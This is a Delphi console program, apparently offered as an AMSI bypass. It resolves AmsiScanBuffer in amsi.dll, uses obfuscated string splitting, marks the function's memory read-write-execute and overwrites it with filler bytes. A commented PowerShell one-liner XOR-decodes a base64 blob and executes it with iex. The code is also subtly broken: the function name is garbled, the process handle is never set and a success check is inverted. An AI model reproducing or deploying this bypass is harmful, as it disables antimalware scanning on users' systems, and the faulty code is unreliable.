program BasedAmsi_E;

{$APPTYPE CONSOLE}

{$R *.res}

{
https://www.sunshine2k.de/articles/coding/tut_Patcher.htm
https://progamercity.net/delphi/245-delphi-memory-modification-tutorial-amp-template.html
https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants
}

//$base64 = "FHJ+YHoTZ1ZARxNgUl5DX1YJEwRWBAFQAFBWHgsFAlEeBwAACh4LBAcDHgNSUAIHCwdQAgALBRQ="; $bytes = [Convert]::FromBase64String($base64); $string = -join ($bytes | % { [char] ($_ -bxor 0x33) }); iex $string


uses
  SysUtils,
  Windows
  ;

var
  PidHandle: integer;
  hProcess: THandle;
  PidID : integer;



  dataout,datain:TBytes;
  Written: UIntPtr;

  lib : THandle;
  asb : Pointer;
  NumWrote : SIZE_T;
  OldProtect : DWord;




  //garbage : Byte = $C3;
  garbage : Array[0..15] of byte = ($41,$41,$41,$41,$41,$41,$41,$41,$41,$41,$41,$41,$41,$41,$41,$41);


type UIntPtr = NativeUInt;

procedure Wpm(Address: Pointer; ChangeValues: Byte);
Begin
 WriteProcessMemory(PidHandle, Address, @ChangeValues, SizeOf(ChangeValues), Written);
End;



begin
  try
  //Init needed
    //WriteLn(GetWindowThreadProcessId(h, PID));
    //Proc := OpenProcess(PROCESS_VM_OPERATION or PROCESS_VM_WRITE, false, PID);
    //WriteLn(Proc);

  //Load and get base address for AmsScanBuffer
    //handle of dll
    lib := LoadLibrary('am'+'si'+'.d'+'ll');

    asb := GetProcAddress(lib,'Ams+\\iS'+'ca'+'nB'+'uf'+'fer');
    WriteLn(Format('[+] dll base address: %p',[asb]));


  //Change memory protection to RWX
    VirtualProtect(asb, SizeOf(garbage), 64, OldProtect);
    WriteLn('[+] RWX protected');

  //Write to memory @ pter
    if not WriteProcessMemory(PidHandle, asb, @garbage, SizeOf(garbage), Written)
    then
      WriteLn('[+] Written ' , Written, ' Bytes');
      //Wpm(asb,$41414141);
      //WriteProcessMemory(PidHandle, asb, PChar('41'), 1, OldProtect);

      WriteLn('[+] Written To amsi.dll');
      //WriteLn(string(@asb));

    //Change memory protection to RWX
      //VirtualProtect(asb, SizeOf(garbage), OldProtect, OldProtect);
      //WriteLn('[+] RX protected');


  except
    on E: Exception do
      Writeln(E.ClassName, ': ', E.Message);
  end;
end.
